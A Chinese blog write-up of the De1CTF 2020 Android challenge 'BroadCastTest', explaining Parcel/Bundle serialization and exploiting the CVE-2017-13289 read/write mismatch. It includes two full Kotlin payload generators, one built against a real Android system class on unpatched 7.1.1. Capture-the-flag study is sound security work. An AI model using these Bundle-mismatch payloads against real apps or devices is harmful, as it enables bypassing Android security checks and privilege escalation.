---
title: De1CTF 2020 - BroadCastTest
date: 2020-05-04 14:06:57
tags: CTF
categories:
- CTF
---
一道 Android Pwn 题目，涉及到对 CVE-2017-13289 的利用，`Bundle` 序列化（`Receiver` 真好玩）。

<!-- more -->

用`dex2jar`把`classes2.dex`转换成jar，然后用JD-GUI打开（感谢队内师傅的提醒，也可以直接使用 `jadx-gui` 来查看，更加方便），可以看到一个Activity和三个Receiver。（PS：这么小一个应用居然还要multidex，真实迷惑行为）
{% asset_img 2020-05-04-14-15-48.png %}
同时用`apktool`解码XML文件，得到如下配置，只有第一个Receiver可以被我们直接使用。
```xml
<receiver android:enabled="true" android:exported="false" android:name="com.de1ta.broadcasttest.MyReceiver3">
    <intent-filter>
        <action android:name="com.de1ta.receiver3"/>
    </intent-filter>
</receiver>
<receiver android:enabled="true" android:exported="false" android:name="com.de1ta.broadcasttest.MyReceiver2">
    <intent-filter>
        <action android:name="com.de1ta.receiver2"/>
    </intent-filter>
</receiver>
<receiver android:enabled="true" android:exported="true" android:name="com.de1ta.broadcasttest.MyReceiver1">
    <intent-filter>
        <action android:name="com.de1ta.receiver1"/>
    </intent-filter>
</receiver>
<activity android:name="com.de1ta.broadcasttest.MainActivity">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
```
三个接收器的具体代码就不放了，总之流程如下：
* `Receiver1` 接收来自其他应用的定向广播，将其中以base64编码的bundle解码后，和当前id一起发送给`Receiver2`,这里*没有发生反序列化*
* `Recevier2` 对该bundle进行反序列化，检查`command`项是否存在，而且其值不能是`getflag`。检查通过后，将该bundle*再次序列化*，发送到`Receiver3`
* `Receiver3` 对该bundle再次进行反序列化，检查`command`项是否存在，而且其值必须是`getflag`。检查通过后，输出flag

同时在 `MainActivity` 下面可以找到一个 `Message` 类，对其中的内容进行搜索可以找到以下内容：
* [CVE-2017-13289](https://www.cvedetails.com/cve/CVE-2017-13289)
* [国内安全人员对这一系列反序列化漏洞的详细解析](https://xz.aliyun.com/t/2364)
* [国外安全人员对这些漏洞的分析](https://habr.com/en/company/drweb/blog/457610/)
* [Google CTS（设备兼容性测试）中有关这一系列漏洞的测试](https://android.googlesource.com/platform/cts/+/444017e123fac55fba3293bf11cd6fa6e6bffa8b/hostsidetests/securitybulletin/test-apps/launchanywhere/src/com/android/security/cts/launchanywhere/CVE_2017_13289.java)

基本上可以确认我们需要复现的漏洞就是这个了。

要想对漏洞进行复现，首先我们要对 `Bundle` 和 `Parcel` 有一定的了解。

`Parcel` 是一系列值构成的序列，这个序列的意义完全取决于读取方式（类似于 `ProtoBuf`），没有什么复杂的结构。

`Parcel` 中所有值均为4字节对齐，定长字段最少4字节，变长字段以4个字节的长度开头，后面的内容也需要填充至4字节对齐；字符串两个字节为一个单位（也就是实际读取字节数为两倍长度加上填充）；全部数值为小端序（LE）。

`Parcel` 也可以用来序列化任何 `Parcelable` 对象，其流程可以简化为写入类名字符串然后直接将当前 `Parcel` 传给 `writeToParcel` 方法。

这类漏洞的核心就在于这些 `Parcelable` 对象在实现的时候读取和写入的大小不匹配（比如读取的是`Long`，写入的却是 `Int`），这样就会造成经过精确构造的
Bundle 后续内容的前面几个字节（本次是4个字节）在第一次读取的时候被“吃掉”。

在读取后再次序列化时，后续内容出现错位，就会导致安全漏洞（**一部分的键值对具有特殊效果，在系统中被传输的时候会进行检测，这种方式可以用来逃避检测，使得这些键值对只在第二次反序列化时出现，或者在第二次反序列化时变为不同的值**）。

而 `Bundle` 可以理解为以 `Parcel` 为基础的键值对结构，在 `Parcel` 的基础上增加了一些字段。

```
0700 0000 c.o. m.m. a.n. d... 0000 0000 0700 0000 g.e. t.f. l.a. g...
|Key Len  |Key                |Val Type |String L |String Content
```
其中比较常用的有00（字符串），0D（`ByteArray`），04（`Parcelable`）。

上图，来自前面提到的两篇分析文章

{% asset_img 2020-05-04-14-47-58.png %}
{% asset_img 2020-05-04-14-48-52.png %}

在反序列化的过程中，还有一个问题需要考虑：根据[官方文档](https://developer.android.com/reference/android/os/Bundle#getParcelable(java.lang.String))

> If the expected value is not a class provided by the Android platform, **you must call setClassLoader(java.lang.ClassLoader) with the proper ClassLoader first.** Otherwise, this method might throw an exception or return null.

也就是说如果不经过特殊设计，`Bundle` 在反序列化时只能生成 Android 系统内部的对象。

一开始我被这个带进了坑里，直到我发现我们的 `Bundle` 不是一个人在战斗：在第二个和第三个接收器中，我们的 `Bundle` 来自一个 `Intent`，而 `Intent` 在生成 `Bundle` 对象时会自动帮我们把 `ClassLoader` 设置成当前应用的 `ClassLoader` ，从而可以加载 `Message` 对象。

这道题的难度是大于原始exp的：
* 在原始漏洞中，我们只需要在第一次反序列化时隐藏一个key（严格来说这个key在此时不可以存在，否则会触发过滤）
* 而在这道题目中，这个需要隐藏的key必须存在，而且类型正确，只是值不正确而已
而在 `Bundle` 底层的 `ArrayMap` 中，对重复的key是有严格的检测的，因此不能通过覆盖的方式改变内容（重复 `put` 会直接报错），需要寻求另外的方法。

上 Payload 生成脚本：
```kotlin
val data = Parcel.obtain()
val bundleLenPos = data.dataPosition()
data.writeInt(-0x1) // 整个Bundle的大小 （除去本字段和magic）
data.writeInt(0x4C444E42) // Bundle Magic BNDL
val bundleStartPos = data.dataPosition()
data.writeInt(3) // 一共有3个键值对

data.writeString("Alaunchanywhere") // 键值对1，key部分
data.writeInt(4) // 类型：Parcelable
data.writeString("com.de1ta.broadcasttest.MainActivity\$Message")
data.writeString("BSSID")
data.writeInt(0) // burstNumber
data.writeInt(0) // measurementFrameNumber
data.writeInt(0) // successMeasurementFrameNumber
data.writeInt(0) // frameNumberPerBurstPeer
data.writeInt(0) // status
data.writeInt(0) // measurementType
data.writeInt(0) // retryAfterDuration
data.writeLong(0) // ts
data.writeInt(0) // rssi
data.writeInt(0) // rssiSpread
data.writeInt(0) // txRate，这里看起来是read int write byte，但由于4字节对齐，长度其实相等
data.writeLong(0) // rtt
data.writeLong(Long.MAX_VALUE) // rttStdev，设置成一个显眼的值，方便定位
data.writeInt(0xAABB) // rttSpread (High)

data.writeInt(0xCCDD) // rttSpread (Low)

data.writeString("\u0007\u0000command\u0000\u0000\u0000\u0007\u0000getflag\u0000\u0000\u0000")
// 下面的内容生成出来其实就是上面这个字符串，但为了正确计算长度，就手写了
// 这个字符串的长度字段（也就是 \u0007 的前一个字节）就是那个被“吃掉”的
// 如果有这个长度字段，第二个键值对的key是整个字符串
// 而没有这个长度字段，key就会变成command，而value就是getflag

//  data.writeInt(-0x1) // W1: rttStread (Low), fake key len, this value is eaten
//  val fakeKeyStartPos = data.dataPosition()
//  data.writeString("command")
//  data.writeInt(0)
//  data.writeString("getflag")

//  val fakeKeyEndPos = data.dataPosition()
//  val fakeKeyLen = fakeKeyEndPos - fakeKeyStartPos
//  data.setDataPosition(fakeKeyStartPos - 4)
//  data.writeInt(fakeKeyLen / 2)
//  data.setDataPosition(fakeKeyEndPos)

//  data.writeInt(0)

// 13*2=26 (+2) bytes, 13 00 00 00 18 00 00 00 [whatever]
val fakeValueLenPos = data.dataPosition() + 4
val fakeValueStartPos = data.dataPosition() + 8
// 这里是第一次读取到的第二个键值对的value部分
// 这里字符串的长度是0xD，也就13，parser会误认为这是类型标记，代表ByteArray
// 将字符串内容的第一个字段覆盖为长度，就可以把直到下一个command为止的内容放进去
data.writeString("qwertyuiopasd")
// 而在第二次读取时，由于错位，这个字符串就变成了第三个键值对的key，而value就是"command"
val fakeValueEndPos = data.dataPosition()

data.setDataPosition(fakeValueLenPos)
data.writeInt(fakeValueEndPos - fakeValueStartPos) // 在这里覆盖长度
data.setDataPosition(fakeValueEndPos)

// 这里是第一次读取到的第三个键值对
data.writeString("command") // 00 00 00 00
// 第二次读取到此结束，由于已经成功读取了三个键值对，后面的内容被忽略
data.writeInt(0)
data.writeString("whatever")


val bundleEndPos = data.dataPosition()
data.setDataPosition(bundleLenPos)
val bundleLen: Int = bundleEndPos - bundleStartPos
data.writeInt(bundleLen)
data.setDataPosition(0)

var raw = data.marshall()

// raw即为最终payload，以下为测试代码，可以忽略

var bundle = Bundle(javaClass.classLoader)
bundle.readFromParcel(data)
var keyset = bundle.keySet()

val newPc = Parcel.obtain()
newPc.writeBundle(bundle)
newPc.setDataPosition(0)

// raw = newPc.marshall()

var bundle2 = Bundle(javaClass.classLoader)
bundle2.readFromParcel(newPc)
keyset = bundle2.keySet()
return
```

最终 Payload 内容，高亮处为错位被丢弃的内容
{% asset_img 2020-05-05-14-49-06.png %}

最后还有一点注意事项：`Bundle` 在进行序列化时的顺序是由一个 `ArrayMap` 内部的顺序决定的，并不能保证和最初反序列化时一致。因此，需要对第一个键值对的key进行一些尝试（在调试器里可以看到hash），从而保证这个对象始终排在第一个。

Bonus: 在未 Patch 原始漏洞的系统（如 7.1.1 模拟器）上，也可以用如下代码完成解题（有部分注释可能有错误）,主要思路基于 CTS 测试
```kotlin
val data = Parcel.obtain()
val bundleLenPos = data.dataPosition()
data.writeInt(-0x1)
data.writeInt(0x4C444E42)
val bundleStartPos = data.dataPosition()
data.writeInt(2)
data.writeString("launchanywhere")
data.writeInt(4)
data.writeString("android.net.wifi.RttManager\$ParcelableRttResults")
data.writeInt(1) // numResults
data.writeString(null) // bssid
data.writeInt(0) // burstNumber
data.writeInt(0) // measurementFrameNumber
data.writeInt(0) // successMeasurementFrameNumber
data.writeInt(0) // frameNumberPerBurstPeer
data.writeInt(0)
data.writeInt(0)
data.writeInt(0)
data.writeLong(0) // ts
data.writeInt(0)
data.writeInt(0)
data.writeInt(0)
data.writeLong(0) // rtt
data.writeLong(0)
data.writeLong(0)
data.writeInt(0) // distance
data.writeInt(0)
data.writeInt(0)
data.writeInt(0)
data.writeInt(0) // End of first lvl
data.writeInt(0xff) // LCI ID (Skipped)
// 这里可以实现消除任意长度（0-254）的内容，因为写错的是一个ByteArray
data.writeInt(28)   // LCR ID
data.writeInt(28)   // LCR Arr Len
data.writeInt(28)   // W: LCR ID, R: LCR Arr Len
// 28 Bytes
data.writeInt(1)    // W: Secure, R: LCR Arr 0-3
data.writeInt(2)    // W:???, -1  R: LCR Arr 4-7
data.writeInt(3)    // W:???, 13  R: LCR Arr 8-11
// Repeat
data.writeInt(4)
data.writeInt(5)
data.writeInt(6)
data.writeInt(7)
data.writeInt(0)

data.writeString("command")
data.writeInt(0)
data.writeString("\u0007\u0000command\u0000\u0000\u0000\u0007\u0000getflag\u0000")
//  val byteArrayLenPos = data.dataPosition()
//  data.writeInt(-0x1)
//  val byteArrayStartPos = data.dataPosition()

//  data.writeString("command");
//  data.writeInt(0)
//  data.writeString("getflag");

//  val byteArrayEndPos = data.dataPosition()
//  data.setDataPosition(byteArrayLenPos)
//  val byteArrayLen = byteArrayEndPos - byteArrayStartPos
//  data.writeInt(byteArrayLen/2)

//  data.setDataPosition(byteArrayEndPos)
val bundleEndPos = data.dataPosition()
data.setDataPosition(bundleLenPos)
val bundleLen: Int = bundleEndPos - bundleStartPos
data.writeInt(bundleLen)

data.setDataPosition(0)

var raw = data.marshall()

var bundle = Bundle()
bundle.readFromParcel(data)
var keyset = bundle.keySet()

val newPc = Parcel.obtain()
newPc.writeBundle(bundle)
newPc.setDataPosition(0)

raw = newPc.marshall()

var bundle2 = Bundle(javaClass.classLoader)
bundle2.readFromParcel(newPc)
keyset = bundle2.keySet()
return
```